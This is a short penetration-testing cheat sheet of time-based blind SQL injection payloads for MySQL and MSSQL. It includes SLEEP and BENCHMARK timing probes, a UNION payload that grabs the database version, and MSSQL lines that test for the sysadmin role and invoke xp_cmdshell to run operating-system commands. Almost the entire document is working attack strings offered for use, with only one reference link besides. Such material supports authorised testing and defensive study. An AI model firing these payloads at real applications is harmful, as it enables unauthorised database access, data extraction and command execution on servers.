---
author(s):
  - Userware
tags:
  - helpers
  - webapp-pentesting
  - server-side-attack
  - blind-sql-injection
---
# Time-based Payloads

## 01 - Detection

### MySQL

Inject time-based blind payloads

```
OR SLEEP(10)
AND SLEEP(10)

' OR IF(1=1, SLEEP(5), 0)#

' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
```

Grab version

```
' OR IF(1=1, SLEEP(5), 0) UNION SELECT (SELECT version())#
```

### MSSQL

```
IF(1=1) WAITFOR DELAY '00:00:05'

' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 EXEC xp_cmdshell('echo Enabled')

' IF (SELECT CASE WHEN (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 THEN WAITFOR DELAY '0:0:16' ELSE 0 END) = 1

' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 0 EXEC xp_cmdshell('echo Disabled')

' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 0 WAITFOR DELAY '0:0:16' ELSE 0 END) = 1

' IF (SELECT SUBSTRING(@@version, 1, 1)) = '1' WAITFOR DELAY '0:0:16'
```

---
## References

### WebSec

- [WebSec: SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)